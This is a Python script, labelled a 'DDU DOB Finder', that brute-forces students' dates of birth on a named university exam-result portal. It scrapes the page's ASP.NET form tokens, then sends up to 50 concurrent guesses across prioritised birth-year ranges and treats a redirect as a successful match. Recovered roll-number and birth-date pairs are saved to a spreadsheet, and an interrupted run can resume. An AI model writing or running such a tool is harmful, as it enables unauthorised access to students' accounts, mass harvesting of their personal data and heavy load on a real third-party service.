# Run this code locally

import os
import asyncio
import aiohttp
from aiohttp import ClientSession
from datetime import datetime, timedelta
from tqdm.auto import tqdm
import pandas as pd
import re

# Constants
OUTPUT_DIR = os.path.join("Information", "Saved DOBs")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def extract_form_data(html):
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    if not all([viewstate, eventvalidation, viewstategenerator]):
        return None
    return {
        "__VIEWSTATE": viewstate.group(1),
        "__EVENTVALIDATION": eventvalidation.group(1),
        "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
    }

def generate_dates_interleaved(years, month=None):
    dates = []
    if month:
        for day in range(1, 32):
            for y in years:
                try:
                    date = datetime(y, month, day)
                    dates.append(date.strftime('%Y-%m-%d'))
                except ValueError:
                    continue
    else:
        start_dates = {y: datetime(y, 1, 1) for y in years}
        end_dates = {y: datetime(y, 12, 31) for y in years}
        current = start_dates.copy()
        while True:
            finished = True
            for y in years:
                if current[y] <= end_dates[y]:
                    dates.append(current[y].strftime('%Y-%m-%d'))
                    current[y] += timedelta(days=1)
                    finished = False
            if finished:
                break
    return dates

async def try_dob(session, roll_no, semester, date_of_birth, semaphore):
    url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"
    async with semaphore:
        try:
            async with session.get(url, timeout=10) as resp:
                if resp.status != 200:
                    return "DOWN"
                html = await resp.text()
            
            form_data = extract_form_data(html)
            if not form_data:
                return None
            
            form_data.update({
                "ddlsem": semester,
                "txtRollno": roll_no,
                "txtDob": date_of_birth,
                "btnSearch": "Search Result"
            })
            
            async with session.post(url, data=form_data, allow_redirects=False, timeout=10) as response:
                if response.status == 302:
                    return date_of_birth
                elif response.status >= 500:
                    return "DOWN"
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return "DOWN"
        except Exception:
            return None
    return None

async def fetch_for_roll(session, roll_no, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename):
    roll_str = str(roll_no).zfill(6)

    for years in priority_groups:
        dates = generate_dates_interleaved(years, month_filter)
        with tqdm(total=len(dates), desc=f"DOBs for {roll_str}", leave=False, position=1, dynamic_ncols=True) as date_pbar:
            for dob in dates:
                result = await try_dob(session, roll_str, semester, dob, semaphore)
                if result == "DOWN":
                    return "DOWN"
                
                date_pbar.update(1)
                if result:
                    async with results_lock:
                        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': result})
                        try:
                            pd.DataFrame(results).to_excel(filename, index=False)
                        except PermissionError:
                            pass # Will be saved later
                    roll_pbar.update(1)
                    return
    # If not found
    async with results_lock:
        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': "N.A."})
        try:
            pd.DataFrame(results).to_excel(filename, index=False)
        except PermissionError:
            pass
    roll_pbar.update(1)
    return None

async def check_website_status(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status == 200:
                return True, "Online"
            elif resp.status == 503:
                return False, "Service Unavailable (503)"
            else:
                return False, f"HTTP Error {resp.status}"
    except Exception as e:
        return False, str(e)

async def run_custom_roll_search(roll_numbers, semester, month_filter):
    priority_groups = [[2003,2004,2005,2006,2007,2008],[1999,2000,2001,2002,2009,2010],[1996,1997,1998,2011,2012,2013]]
    filename = os.path.join(OUTPUT_DIR, f"ddu_custom_results.xlsx")
    url = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"

    connector = aiohttp.TCPConnector(limit=100)
    async with ClientSession(connector=connector) as session:
        print(f"🔍 Checking website status...")
        is_up, status_msg = await check_website_status(session, url)
        if not is_up:
            print(f"🛑 Website is DOWN: {status_msg}")
            print("Please try again later.")
            return

        if os.path.exists(filename):
            existing_df = pd.read_excel(filename)
            completed_rolls = set(existing_df["Roll Number"].astype(int))
            print(f"🔁 Resuming... {len(completed_rolls)} already done.")
        else:
            existing_df = pd.DataFrame()
            completed_rolls = set()

        remaining_rolls = [rn for rn in roll_numbers if rn not in completed_rolls]
        results = existing_df.to_dict(orient="records")
        results_lock = asyncio.Lock()
        semaphore = asyncio.Semaphore(50)

        with tqdm(total=len(remaining_rolls), desc="📦 Roll Numbers Done", position=0, dynamic_ncols=True) as roll_pbar:
            tasks = [
                fetch_for_roll(session, rn, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename)
                for rn in remaining_rolls
            ]
            task_results = await asyncio.gather(*tasks)
            
            if "DOWN" in task_results:
                print(f"\n🛑 The website went down during the search. Some results might be missing.")
                print("Please try again later.")

    while True:
        if not results:
            break
        try:
            pd.DataFrame(results).to_excel(filename, index=False)
            break
        except PermissionError:
            print(f"\n⚠️ Please close {filename} to save final results. Retrying in 5 seconds...")
            await asyncio.sleep(5)

    print(f"\n✅ Results saved to: {filename}")

def run_custom_main():
    print("🎯 Custom Roll Search | DDU DOB Finder")
    try:
        roll_input = input("Enter Roll Numbers (comma separated): ").strip()
        roll_numbers = list(map(int, roll_input.split(',')))
        semester = input("Enter Semester (1-8): ").strip()
        month = input("Enter specific month to search (1-12 or blank for all months): ").strip()
        month_filter = int(month) if month.isdigit() and 1 <= int(month) <= 12 else None
        asyncio.run(run_custom_roll_search(roll_numbers, semester, month_filter))
    except Exception as e:
        print(f"❌ Error: {e}")

# 🚀 Launch
run_custom_main()

#2515075160
